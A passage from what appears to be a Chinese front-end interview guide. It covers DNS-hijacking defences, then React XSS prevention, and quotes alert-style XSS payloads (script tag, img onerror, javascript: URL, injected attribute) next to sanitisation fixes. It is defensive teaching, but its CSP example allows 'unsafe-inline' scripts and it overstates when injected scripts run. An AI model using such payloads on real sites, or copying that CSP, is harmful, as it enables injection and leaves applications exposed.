<span class="line"><span>跳过 DNS 查询</span></span></code></pre></div><p><strong>Windows:</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>C:\Windows\System32\drivers\etc\hosts</span></span></code></pre></div><p><strong>Linux/macOS:</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>/etc/hosts</span></span></code></pre></div><p><strong>示例：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>93.184.216.34 www.example.com</span></span>
<span class="line"><span>93.184.216.34 example.com</span></span></code></pre></div><p><strong>7. 使用 HTTPS</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>即使 DNS 被劫持</span></span>
<span class="line"><span>HTTPS 会验证证书</span></span>
<span class="line"><span>防止访问虚假网站</span></span></code></pre></div><p><strong>8. 使用代理或加速器</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>通过代理服务器访问</span></span>
<span class="line"><span>绕过运营商 DNS</span></span></code></pre></div><p><strong>推荐方案（按优先级）：</strong></p><ol><li><p><strong>使用公共 DNS + DoH</strong></p><ul><li>简单有效</li><li>大部分浏览器支持</li></ul></li><li><p><strong>使用 HTTPS + HSTS</strong></p><ul><li>防止访问虚假网站</li><li>即使 DNS 被劫持</li></ul></li><li><p><strong>使用 VPN</strong></p><ul><li>全面加密</li><li>绕过运营商限制</li></ul></li><li><p><strong>修改 hosts 文件</strong></p><ul><li>适用于常用网站</li><li>手动维护</li></ul></li></ol><p><strong>最佳实践：</strong></p><ol><li>使用公共 DNS（如 Cloudflare 1.1.1.1）</li><li>启用 DNS over HTTPS</li><li>所有网站使用 HTTPS</li><li>配置 HSTS</li><li>定期检查 DNS 设置</li><li>避免使用运营商提供的 DNS</li></ol><hr><h2 id="_27、react-xss-如何防范和解决" tabindex="-1">27、React XSS 如何防范和解决？ <a class="header-anchor" href="#_27、react-xss-如何防范和解决" aria-label="Permalink to &quot;27、React XSS 如何防范和解决？&quot;">​</a></h2><p><strong>React XSS 防范：</strong></p><p><strong>React 默认的 XSS 防护：</strong></p><p><strong>1. 自动转义</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// React 会自动转义</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> userInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 直接渲染，自动转义</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;{userInput}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 输出: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 安全，不会执行脚本</span></span></code></pre></div><p><strong>2. JSX 默认转义</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 所有 JSX 中的内容都会被转义</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> html</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;{html}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 安全</span></span></code></pre></div><p><strong>危险的 XSS 场景：</strong></p><p><strong>1. dangerouslySetInnerHTML</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险！直接渲染 HTML</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> userInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dangerouslySetInnerHTML</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{{ __html: userInput }} /&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 会执行脚本，不安全</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 方案1: 使用 DOMPurify 清理 HTML</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> cleanHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(userInput);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dangerouslySetInnerHTML</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{{ __html: cleanHtml }} /&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 安全</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 方案2: 使用白名单标签</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sanitizeHtml </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;sanitize-html&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> cleanHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sanitizeHtml</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(userInput, {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  allowedTags: [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;b&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;i&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;em&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;strong&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">],</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  allowedAttributes: {}</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span></code></pre></div><p><strong>2. href 中的 javascript:</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险！</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> userInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;javascript:alert(1)&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> href</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{userInput}&gt;点击&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 点击会执行脚本</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 验证 URL</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> isValidUrl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">url</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> url.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">startsWith</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http://&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">||</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> url.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">startsWith</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> href</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">isValidUrl</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(userInput) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> userInput </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;#&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}&gt;点击&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 安全</span></span></code></pre></div><p><strong>3. 动态执行代码（eval, Function）</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险！</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> code</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;alert(&quot;XSS&quot;)&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">eval</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(code);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(code)();</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 避免使用 eval 和 Function</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 使用安全的方式处理动态行为</span></span></code></pre></div><p><strong>4. 动态属性名</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险！</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> userInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;onclick=&quot;alert(1)&quot;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">...</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{ [userInput]: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> }} /&gt;</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 使用白名单属性</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> safeProps</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  onClick: handleClick</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">...</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">safeProps} /&gt;</span></span></code></pre></div><p><strong>完整的 XSS 防护方案：</strong></p><p><strong>1. 安装安全依赖</strong></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">npm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dompurify</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sanitize-html</span></span></code></pre></div><p><strong>2. 创建安全的 HTML 渲染组件</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> SafeHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ({ </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> }) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> cleanHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(html);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dangerouslySetInnerHTML</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{{ __html: cleanHtml }} /&gt;;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 使用</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SafeHtml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> html</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&lt;p&gt;Hello&lt;/p&gt;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span></code></pre></div><p><strong>3. URL 验证工具</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> isValidUrl</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">url</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  try</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> parsed</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> URL</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(url);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;http:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">].</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">includes</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(parsed.protocol);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">catch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> href</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">isValidUrl</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(url) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;#&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}&gt;Link&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>4. 内容安全策略 (CSP)</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 在 index.html 中配置</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      content</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>5. 输入验证</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> validateInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">input</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 白名单验证</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> allowed</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[a-zA-Z0-9\s.,!?]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> allowed.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">test</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(input);</span></span>
